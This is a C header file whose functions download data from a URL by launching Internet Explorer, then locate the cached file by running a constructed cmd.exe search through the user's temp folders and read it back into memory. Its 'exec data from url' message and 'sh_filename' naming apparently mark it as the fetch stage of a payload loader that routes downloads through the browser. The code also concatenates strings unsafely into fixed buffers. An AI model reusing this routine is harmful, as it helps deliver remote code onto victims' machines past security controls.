#pragma once

#include <stdio.h>
#include <windows.h>
#include "../debug_print/debug_print.h"
#include "helper_functions/helper_functions.h"


// return pointer to the filename
// string = url
char* ie_download(char* string) {
	char ie[500];
	GetEnvironmentVariable("PROGRAMFILES",ie,100);
	strcat(ie,"\\Internet Explorer\\iexplore.exe");
	ShellExecute(0, "open", ie , string, NULL, SW_SHOWDEFAULT);

	// wait a little until the file is loaded
	Sleep(8000);

	// get the filename to search format in the ie temp directory
	char delimiter[] = "/";
	char *ptr;
	char *fname;
	ptr = strtok(string, delimiter);
	while(ptr != NULL)
	{
		fname = ptr;
		ptr = strtok(NULL, delimiter);
	}

	DEBUG_PRINT("ie_download, filename: %s\n", fname);
	
	// split the filename
	char delimiter2[] = ".";
	char *sname;
	ptr = strtok(fname, delimiter2);
	sname = ptr;
	ptr = strtok(NULL, delimiter2);

	DEBUG_PRINT("ie_download, name to search for: %s\n", sname);
	
	// search for the file in user profile

	// build searchstring
	char tmp[150];
	char tmp_home[150];
	GetEnvironmentVariable ("USERPROFILE",tmp_home,150);
	GetEnvironmentVariable ("TEMP",tmp,150);
	tmp [ strlen(tmp) - 5 ] = 0x0;
	//printf("\n\n%s\n\n",tmp);
	char searchstring[500] = "/C ";
	strncat (searchstring,tmp_home,1);
	strcat (searchstring,": && cd \"");
	strcat (searchstring,tmp);
	strcat (searchstring,"\" && dir . /s /b | find \"");
	strcat (searchstring,sname);
	strcat (searchstring,"\" > \"");
	strcat (searchstring,tmp_home);
	strcat (searchstring,"\\datafile.txt\"");
	
	DEBUG_PRINT("ie_download, searchstring: %s\n", searchstring);
	
	// build & execute cmd
	char cmd[500];
	GetEnvironmentVariable ("WINDIR",cmd,500);
	strcat (cmd,"\\system32\\cmd.exe");
	ShellExecute (0, "open", "cmd.exe" , searchstring, NULL, SW_SHOWDEFAULT);

	//now read the directory + filename from the textfile
	char dirfile[500] = {0};
	strcat (dirfile, tmp_home);
	strcat (dirfile, "\\datafile.txt");
	char *sh_filename;
	int size_sh_filename=0;
	int counter = 0;
	while(size_sh_filename==0 && counter <= 1000)
	{
		size_sh_filename = get_filesize (dirfile);
		Sleep(500);
		counter++;
	}

	sh_filename = load_textfile (dirfile, size_sh_filename);
	// there is always emtpy space at the end of the file -> delete that
	sh_filename[size_sh_filename-2]=0x0;
	
	DEBUG_PRINT("ie_download, sh_filename: >>>%s<<<, size: %d\ntest\n", sh_filename, size_sh_filename);
	
	return sh_filename;
}


// Retrieval of data via IE download to file. The data is then read from the file and returned.
//
// arg1 specifies the URL to download the file from.
// data_size receives the size of the data in bytes.
unsigned char* download_internet_explorer(char *arg1, int *data_size) {
    DEBUG_PRINT("This is download_internet_explorer.\n");
	DEBUG_PRINT("exec data from url\n");
		
	char *sh_filename = ie_download(arg1);
	*data_size = get_filesize(sh_filename);	
	return load_textfile(sh_filename, *data_size);
}
